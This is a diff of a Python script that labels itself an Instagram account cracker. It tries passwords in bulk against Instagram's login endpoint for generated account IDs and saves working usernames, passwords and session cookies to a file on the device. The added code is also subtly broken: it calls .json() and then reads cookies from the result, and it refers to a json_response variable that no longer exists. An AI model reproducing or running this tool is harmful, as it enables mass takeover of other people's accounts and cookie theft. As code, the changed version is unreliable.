@@ -968,12 +968,11 @@ def random_number():
     with ThreadPoolExecutor(max_workers=30) as XYZ:
         clear()
         total_idz = str(len(idz))
-        print(f"\033[1;96m KING IS ALWAYS KING")
-        print(f"\033[1;96m SOME RESPECT")
+        print(f"\033[1;96m INSTAGRAM IDZ CRACK")
         linex()
-        print(f' \033[1;32m(√) \033[1;37mTotal IDs  :\033[1;32m ',total_idz)
-        print(' \033[1;37m{\033[1;32m+\033[1;37m} \033[1;35mCHOICE SIM CODE : \033[1;32m'+code)
-        print(" \x1b[38;5;208m(!) \x1b[38;5;205mUse Flight Mode For Speed UP");print(' \033[1;33m[•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/XYZ')
+        print(f' \033[1;32m(!) \033[1;37mTotal IDs  :\033[1;32m ',total_idz)
+        print(' \033[1;37m(!) \033[1;35mCHOICE SIM CODE : \033[1;32m'+code)
+        print(" \x1b[38;5;208m(!) \x1b[38;5;205mUse Flight Mode For Speed UP")
         linex()
         for xyz in idz:
             uid = code+xyz
@@ -2137,7 +2136,7 @@ def crack(uid, pww, total_idz):
     global oks
     global cps
     x = random.choice(["\033[1;90m","\033[1;91m","\033[1;92m" ,"\x1b[38;5;208m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
-    sys.stdout.write(f"\r{x}[BITHIKA] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)} \033[1;97m[\033[1;93m{'{:.0%}'.format(loop/float(total_idz))}\033[1;97m] ")
+    sys.stdout.write(f"\r{x}[SUMON] {loop}/{total_idz} \033[1;92m{len(oks)}")
     sys.stdout.flush()
     try:
         for pw in pww:
@@ -2189,32 +2188,30 @@ def crack(uid, pww, total_idz):
             'x-requested-with': 'XMLHttpRequest',
             'x-web-session-id': '9k4qw4:jior4r:km1zo0',}
             login_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
-            response = requests.post(login_url, cookies=cookies, headers=headers, data=data)
+            response = requests.post(login_url, data=data, cookies=cookies, headers=headers).json()
             session_cookies = response.cookies.get_dict()
-            if response.status_code == 200:
-                json_response = response.json()
-                if json_response.get('status') == 'ok':
-                   if json_response.get('authenticated') == True:
-                        cookie = ';'.join(['%s=%s'%(name,value) for name, value in requests.cookies.get_dict().items()])
-                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                        print(f"\r\033[1;92m [cookie] {cookie}")
-                        open("/sdcard/INSTAGRAM-RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookie}\n")
-                        oks.append(uid)
-                        break
-                   elif json_response.get('auth_token'):
-                        cookie = ';'.join(['%s=%s'%(name,value) for name, value in requests.cookies.get_dict().items()])
-                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                        print(f"\r\033[1;92m [cookie] {cookie}")
-                        open("/sdcard/INSTAGRAM-RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookie}\n")
-                        oks.append(uid)
-                        break
-                   elif 'sessionid' in session_cookies:
-                        cookie = ';'.join(['%s=%s'%(name,value) for name, value in requests.cookies.get_dict().items()])
-                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                        print(f"\r\033[1;92m [cookie] {cookie}")
-                        open("/sdcard/INSTAGRAM-RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookie}\n")
-                        oks.append(uid)
-                        break
+            if response.get('status') == 'ok':
+               if json_response.get('authenticated') == True:
+                   cookie = ';'.join(['%s=%s'%(name,value) for name, value in requests.cookies.get_dict().items()])
+                   print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
+                   print(f"\r\033[1;92m [cookie] {cookie}")
+                   open("/sdcard/INSTAGRAM-RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookie}\n")
+                   oks.append(uid)
+                   break
+               elif json_response.get('auth_token'):
+                   cookie = ';'.join(['%s=%s'%(name,value) for name, value in requests.cookies.get_dict().items()])
+                   print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
+                   print(f"\r\033[1;92m [cookie] {cookie}")
+                   open("/sdcard/INSTAGRAM-RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookie}\n")
+                   oks.append(uid)
+                   break
+            elif 'sessionid' in session_cookies:
+                   cookie = ';'.join(['%s=%s'%(name,value) for name, value in requests.cookies.get_dict().items()])
+                   print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
+                   print(f"\r\033[1;92m [cookie] {cookie}")
+                   open("/sdcard/INSTAGRAM-RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookie}\n")
+                   oks.append(uid)
+                   break
             else:
                 #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                 continue
